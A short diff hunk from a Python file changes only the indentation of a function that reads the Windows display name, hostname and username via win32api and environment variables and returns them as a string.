@@ -11,11 +11,11 @@ from PIL import ImageGrab
 
 
 def user():
-        display_name = win32api.GetUserNameEx(win32api.NameDisplay)
-        hostname = os.getenv('COMPUTERNAME')
-        username = os.getenv('USERNAME')
+    display_name = win32api.GetUserNameEx(win32api.NameDisplay)
+    hostname = os.getenv('COMPUTERNAME')
+    username = os.getenv('USERNAME')
 
-        return f"\nDisplay Name: {display_name} \nHostname: {hostname} \nUsername: {username}"
+    return f"\nDisplay Name: {display_name} \nHostname: {hostname} \nUsername: {username}"
         
 
 def system():
